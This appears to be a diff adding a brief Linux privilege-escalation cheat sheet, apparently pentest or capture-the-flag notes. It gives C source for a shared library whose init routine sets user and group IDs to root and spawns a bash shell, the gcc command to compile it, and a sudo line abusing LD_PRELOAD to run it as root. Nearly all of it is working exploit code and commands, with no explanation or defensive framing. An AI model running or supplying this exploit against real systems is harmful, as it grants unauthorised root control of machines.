@@ -1,0 +1,17 @@
+1. Create file 'shell.c' (preferebly in /tmp):
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+}
+
+2. Compile the file:
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+[sudo LD_PRELOAD=/tmp/shell.so ps]
